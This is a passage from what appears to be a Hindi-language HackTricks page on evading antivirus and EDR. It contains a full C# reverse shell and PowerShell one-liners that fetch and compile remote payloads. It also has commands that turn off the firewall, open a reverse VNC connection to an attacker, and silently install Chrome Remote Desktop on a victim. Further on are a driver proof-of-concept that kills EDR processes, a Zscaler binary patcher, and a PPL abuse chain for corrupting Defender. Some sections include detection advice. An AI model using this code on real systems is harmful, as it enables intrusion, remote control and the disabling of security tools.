+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मेकैनिज़्म है जो applications और system components को **लॉग इवेंट्स** करने की अनुमति देता है। हालाँकि, इसे security products द्वारा malicious गतिविधियों की निगरानी और पहचान के लिए भी इस्तेमाल किया जा सकता है।

जैसे AMSI को disable (bypass) किया जाता है, वैसे ही किसी user space process के **`EtwEventWrite`** फ़ंक्शन को तुरंत return करवा कर भी बिना किसी इवेंट को लॉग किए उसे नॅन-ऑप किया जा सकता है। यह प्रक्रिया मेमोरी में फ़ंक्शन को patch कर के उसे तुरंत लौटने के लिए मजबूर कर के की जाती है, जिससे उस प्रोसेस के लिए ETW लॉगिंग प्रभावी रूप से disabled हो जाती है।

आप अधिक जानकारी इस में पा सकते हैं: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**।


## C# Assembly Reflection

C# बायनरीज़ को मेमोरी में लोड करना काफी समय से जाना-पहचाना तरीका है और यह अभी भी AV द्वारा पकड़े बिना post-exploitation tools चलाने का एक बेहतरीन तरीका है।

चूँकि payload सीधे मेमोरी में लोड होगा और डिस्क को टच नहीं करेगा, हमें पूरे process के लिए केवल AMSI को patch करने के बारे में चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे मेमोरी में execute करने की क्षमता प्रदान करते हैं, पर इसे करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn** किया जाता है, उस नए प्रोसेस में आपका post-exploitation malicious code inject किया जाता है, आपका malicious code execute होता है और खत्म होने पर वह नया प्रोसेस kill कर दिया जाता है। इसके फायदे और नुकसान दोनों हैं। Fork and run के तरीके का फायदा यह है कि execuction हमारे Beacon implant process के बाहर होती है। इसका मतलब है कि अगर हमारी post-exploitation action में कुछ गड़बड़ हो या पकड़ा जाए, तो हमारी **implant के बचने** की संभावना काफी अधिक रहती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की आपकी **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने malicious post-exploitation code को **अपने ही process** में inject करने के बारे में है। इस तरह आप नया प्रोसेस बनाने और AV द्वारा उसे स्कैन कराए जाने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गड़बड़ हुआ तो आपकी **beacon खो जाने** की संभावना बहुत अधिक है क्योंकि यह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो इस आर्टिकल को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell** से भी लोड कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

जैसा कि [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित है, अन्य भाषाओं का उपयोग करके malicious code execute करना संभव है यदि compromised मशीन को attacker-controlled SMB share पर इंस्टॉल किए गए interpreter environment तक access दिया जाए।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised मशीन की मेमोरी के अंदर इन भाषाओं में arbitrary code execute कर सकते हैं।

Repo बताता है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक लचीलापन** होती है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल रहे हैं।

## TokenStomping

Token stomping एक तकनीक है जो attacker को **access token या किसी security product जैसे EDR या AV** को manipulate करने की अनुमति देती है, जिससे वे उसके privileges कम कर सकते हैं ताकि process मर न जाए पर उसे malicious गतिविधियों की जाँच करने की अनुमति न रहे।

इसे रोकने के लिए Windows external processes को security processes के tokens पर handles लेने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**इस ब्लॉग पोस्ट**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में वर्णित है, किसी victim के PC पर Chrome Remote Desktop deploy कर के उसे takeover करना और persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. victim पर silently installer चलाएँ (admin आवश्यकता): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएं और next पर क्लिक करें। विज़ार्ड फिर आपसे authorization मांगेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए पैरामीटर को कुछ समायोजन के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin पैरामीटर जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)。


## Advanced Evasion

Evasion एक बहुत ही जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग-अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए परिपक्व वातावरणों में पूरी तरह से undetected रहना लगभग असंभव है।

हर environment के अपने strengths और weaknesses होंगे।

मैं आपको अत्यधिक प्रोत्साहित करता हूं कि आप [@ATTL4S](https://twitter.com/DaniLJ94) की इस talk को देखें, ताकि Advanced Evasion techniques में एक foothold मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक और शानदार talk भी है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को हटाता जाएगा जब तक कि यह पता न लगा ले कि Defender किस हिस्से को malicious मान रहा है और आपको उसे विभाजित करके दिखा देगा।\
एक और टूल जो यही काम करता है वह है [**avred**](https://github.com/dobin/avred) जिसका एक सार्वजनिक वेब सर्विस [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 आने तक, सभी Windows में एक **Telnet server** आता था जिसे आप (administrator के रूप में) इस तरह इंस्टॉल कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **start** होने के लिए सेट करें और अभी इसे **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) और firewall अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**ON THE HOST**: Execute _**winvnc.exe**_ और server को configure करें:

- विकल्प _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई बनाई गई** फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर रखें

#### **Reverse connection**

The **attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह reverse **VNC connection** पकड़ने के लिए तैयार रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- `winvnc` को तब शुरू न करें यदि यह पहले से चल रहा है वरना आप एक [popup](https://i.imgur.com/1SROTTl.png) trigger कर देंगे। चल रहा है या नहीं जांचने के लिए `tasklist | findstr winvnc`
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` शुरू न करें वरना यह [the config window](https://i.imgur.com/rfMQWcf.png) खोल देगा
- मदद के लिए `winvnc -h` चलाने से बचें वरना आप एक [popup](https://i.imgur.com/oc18wcu.png) trigger कर देंगे

### GreatSCT

डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **start the lister** शुरू करें और **xml payload** को **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current Defender बहुत जल्दी process को समाप्त कर देगा।**

### अपने खुद के reverse shell को कम्पाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे कम्पाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे निम्न के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using कम्पाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python का उपयोग करके बिल्ड इंजेक्टर का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य टूल
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ने एक छोटे console utility जिसे <code>Antivirus Terminator</code> कहा जाता है, का उपयोग करके endpoint सुरक्षा को अक्षम किया और फिर ransomware गिराई। यह tool अपना खुद का vulnerable लेकिन *signed* driver लाता है और इसे गलत तरीके से उपयोग करके privileged kernel operations जारी करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी ब्लॉक नहीं कर सकतीं।

Key take-aways
1. **Signed driver**: डिस्क पर जो फ़ाइल डिलीवर की जाती है वह `ServiceMouse.sys` है, लेकिन बाइनरी असल में Antiy Labs के “System In-Depth Analysis Toolkit” से वैध रूप से signed driver `AToolsKrnl64.sys` है। क्योंकि driver पर एक मान्य Microsoft signature है, यह तब भी लोड हो जाता है जब Driver-Signature-Enforcement (DSE) सक्षम होता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन driver को एक **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे शुरू करती है ताकि `\\.\ServiceMouse` user land से उपलब्ध हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी प्रक्रिया को समाप्त करना (Defender/EDR services को मारने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी arbitrary फ़ाइल को हटाना |
| `0x990001D0` | ड्राइवर को unload करना और सेवा को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode सुरक्षा को पूरी तरह स्किप कर देता है; kernel में चलने वाला कोड protected processes को खोल सकता है, उन्हें terminate कर सकता है, या kernel objects के साथ छेड़छाड़ कर सकता है चाहे PPL/PP, ELAM या अन्य hardening फीचर्स मौजूद हों।

Detection / Mitigation
• Microsoft के vulnerable-driver block list (`HVCI`, `Smart App Control`) को सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इनकार करे।  
• नए *kernel* services के निर्माण की निगरानी करें और अलर्ट करें जब कोई ड्राइवर world-writable directory से लोड किया जाए या allow-list पर न हो।  
• कस्टम device objects के लिए user-mode handles और उसके बाद होने वाले संदिग्ध `DeviceIoControl` कॉल्स पर नजर रखें।  

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s Client Connector स्थानीय रूप से device-posture नियम लागू करता है और परिणामों को अन्य घटकों को संप्रेषित करने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिज़ाइन विकल्प एक पूर्ण bypass को संभव बनाते हैं:

1. Posture evaluation पूरी तरह से client-side पर होता है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह सत्यापित करते हैं कि connecting executable Zscaler द्वारा signed है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को patch करके दोनों mechanisms को neutralise किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है इसलिए हर चेक compliant हो जाता है |
| `ZSAService.exe` | `Indirect call to \`WinVerifyTrust\`` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदला गया |
| `ZSATunnel.exe` | Tunnel पर integrity checks | बायपास किया गया |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल फाइलों को बदलने और सर्विस स्टैक को पुनरारम्भ करने के बाद:

* **सभी** posture checks **green/compliant** प्रदर्शित करते हैं।
* Unsigned या संशोधित binaries नामित-पाइप RPC endpoints खोल सकते हैं (उदा. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* समझौता किया गया होस्ट Zscaler नीतियों द्वारा परिभाषित आंतरिक नेटवर्क तक असीमित पहुँच प्राप्त कर लेता है।

यह केस स्टडी दिखाती है कि कैसे केवल client-side ट्रस्ट निर्णय और सरल सिग्नेचर चेक कुछ बाइट पैचेस से विफल किए जा सकते हैं।

## Protected Process Light (PPL) का दुरुपयोग कर AV/EDR को LOLBINs के साथ टैंपर करना

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान-या-उच्च सुरक्षा वाले protected processes ही एक दूसरे को टैंपर कर सकें। Offensive दृष्टिकोण से, अगर आप वैध रूप से कोई PPL-enabled binary लॉन्च कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो आप benign functionality (जैसे logging) को एक constrained, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories के खिलाफ काम करता है।

What makes a process run as PPL
- Target EXE (and any loaded DLLs) को PPL-capable EKU के साथ साइन किया जाना चाहिए।
- प्रोसेस को CreateProcess का उपयोग करके इन flags के साथ बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- एक compatible protection level अनुरोध किया जाना चाहिए जो binary के signer से मेल खाता हो (उदा., anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत level होने पर creation विफल हो जाएगी।

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN प्रिमिटिव: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` स्वयं-स्पॉन करता है और caller-specified path पर एक log फ़ाइल लिखने के लिए एक parameter स्वीकार करता है।
- जब इसे एक PPL प्रक्रिया के रूप में लॉन्च किया जाता है, तो फ़ाइल लिखना PPL backing के साथ होता है।
- ClipUp स्पेस वाले paths को पार्स नहीं कर सकता; सामान्यतः सुरक्षित लोकेशनों की ओर संकेत करने के लिए 8.3 short paths का प्रयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करें: `dir /x` प्रत्येक parent directory में।
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (सारांश)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ लॉन्च करें एक launcher का उपयोग करके (उदा., CreateProcessAsPPL)।
2) ClipUp को log-path आर्गुमेंट पास करें ताकि protected AV directory (उदा., Defender Platform) में फ़ाइल बनाना मजबूर किया जा सके। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) अगर target binary सामान्यतः AV द्वारा चलने के दौरान open/locked रहती है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर लिखने का शेड्यूल करें — इसके लिए एक auto-start service इंस्टॉल करें जो विश्वसनीय रूप से पहले चले। Process Monitor (boot logging) से boot ordering सत्यापित करें।
4) रीबूट पर PPL-backed लिखना AV के बाइनरी लॉक करने से पहले होता है, जिससे target फ़ाइल भ्रष्ट हो जाती है और स्टार्टअप रुक जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप placement के अलावा ClipUp द्वारा लिखी जाने वाली सामग्री को नियंत्रित नहीं कर सकते; यह primitive सटीक कंटेंट इंजेक्शन के बजाय भ्रष्ट करने के लिए उपयुक्त है।
- सेवा इंस्टॉल/स्टार्ट करने और रिबूट विंडो के लिए local admin/SYSTEM की आवश्यकता होती है।
- टाइमिंग महत्वपूर्ण है: लक्ष्य खुला नहीं होना चाहिए; बूट-टाइम निष्पादन फाइल लॉक से बचाता है।

Detections
- असामान्य arguments के साथ `ClipUp.exe` की process रचना, विशेषकर non-standard launchers द्वारा parent की गई और बूट के आसपास।
- ऐसे नए services जो suspicious binaries को auto-start के लिए कॉन्फ़िगर किए गए हों और जो लगातार Defender/AV से पहले शुरू हों। Defender startup विफलताओं से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform डायरेक्टरीज़ पर file integrity monitoring; protected-process flag वाले processes द्वारा अनपेक्षित file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा असामान्य PPL स्तर उपयोग की तलाश करें।

Mitigations
- WDAC/Code Integrity: यह सीमित करें कि कौन से signed binaries PPL के रूप में और किन parents के तहत चल सकते हैं; वैध contexts के बाहर ClipUp invocation को ब्लॉक करें।
- Service hygiene: auto-start services के creation/modification को सीमित करें और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हैं; binary corruption के संकेत देने वाली startup त्रुटियों की जाँच करें।
- यदि आपके वातावरण के साथ संगत हो तो security tooling होस्ट करने वाले वॉल्यूम पर 8.3 short-name generation को अक्षम करने पर विचार करें (पूरी तरह परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
